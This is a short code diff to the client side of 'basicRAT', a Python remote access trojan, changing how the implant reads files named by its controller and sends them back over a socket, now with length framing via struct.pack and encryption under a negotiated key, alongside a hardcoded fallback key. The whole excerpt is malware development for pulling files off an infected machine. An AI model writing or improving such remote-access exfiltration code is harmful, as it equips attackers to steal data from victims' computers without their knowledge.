@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 
 from basicRAT import *
-
+import struct
 HOST = 'localhost'
 PORT = 1337
 FALLBACK_KEY  = '82e672ae054aa4de6f042c888111686a'
@@ -37,16 +37,14 @@ def main():
             
             for fname in action.split():
                 fname = fname.strip()
-                
+                print 'requested file: {}'.format(fname)
                 with open(fname, 'rb') as f:
                     res = f.read(4096)
                     while len(res):
-                        s.send(int_to_bytestring(len(res)))
-                        x = s.send(res)
+                        s.send(struct.pack("!I", len(res)))
+                        x = s.send(encrypt(res, DHKEY))
                         res = f.read(4096)
-                    s.send('\x00'); # EOF
-            
-            
+                    s.send('\x00\x00\x00\x00'); # EOF
             
             # f_name = action.split()[0]
 
